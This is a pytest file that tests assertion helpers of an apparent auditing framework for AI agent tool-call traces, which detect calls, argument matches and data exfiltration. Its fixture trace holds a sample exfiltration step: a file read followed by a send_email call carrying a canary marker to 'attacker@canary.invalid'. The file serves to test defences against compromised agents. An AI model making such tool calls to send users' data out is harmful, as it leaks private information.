from __future__ import annotations

import re

import pytest

from core.assertions import (
    AuditFinding,
    assert_argument_matches,
    assert_data_exfiltrated,
    assert_tool_called,
    assert_tool_not_called,
    evaluate_check,
)
from core.models import ToolCall, Trace


def make_trace() -> Trace:
    return Trace(
        trace_id="trace-1",
        tool_calls=[
            ToolCall(
                name="read_file",
                arguments={"path": "/tmp/foo.txt"},
                result="file contents",
                raw={},
            ),
            ToolCall(
                name="send_email",
                arguments={
                    "to": "attacker@canary.invalid",
                    "body": "CANARY-ME-01",
                },
                result="sent",
                raw={},
            ),
        ],
        raw={"trace_id": "trace-1"},
    )


def test_assert_tool_called_passes():
    calls = assert_tool_called(make_trace(), "read_file")
    assert len(calls) == 1
    assert calls[0].name == "read_file"


def test_assert_tool_called_raises_audit_finding():
    with pytest.raises(AuditFinding):
        assert_tool_called(make_trace(), "delete_file")


def test_assert_tool_not_called_raises_with_offending_calls():
    with pytest.raises(AuditFinding) as exc:
        assert_tool_not_called(make_trace(), "read_file")
    assert len(exc.value.tool_calls) == 1
    assert exc.value.tool_calls[0].name == "read_file"


def test_assert_argument_matches_substring():
    assert assert_argument_matches(make_trace(), "read_file", "path", "/tmp")


def test_assert_argument_matches_regex():
    assert assert_argument_matches(make_trace(), "send_email", "body", re.compile(r"CANARY-[A-Z]+-\d+"))


def test_assert_argument_matches_nested_dict():
    trace = Trace(
        tool_calls=[
            ToolCall(
                name="update_record",
                arguments={"record": {"id": "user_a_record_123"}, "fields": {"status": "approved"}},
            )
        ]
    )
    assert assert_argument_matches(trace, "update_record", "id", "user_a_record_123")


def test_assert_data_exfiltrated():
    assert assert_data_exfiltrated(make_trace(), "send_email", "CANARY-ME-01")


def test_evaluate_check_true_for_vuln_condition():
    trace = make_trace()
    assert evaluate_check(trace, {"type": "tool_called", "tool_name": "send_email"})
    assert evaluate_check(
        trace,
        {
            "type": "argument_matches",
            "tool_name": "send_email",
            "argument_key": "body",
            "pattern": "CANARY",
        },
    )


def test_evaluate_check_false_when_not_present():
    trace = make_trace()
    assert not evaluate_check(trace, {"type": "tool_called", "tool_name": "delete_file"})
    assert not evaluate_check(trace, {"type": "data_exfiltrated", "tool_name": "send_email", "marker": "CANARY-NOT-HERE"})
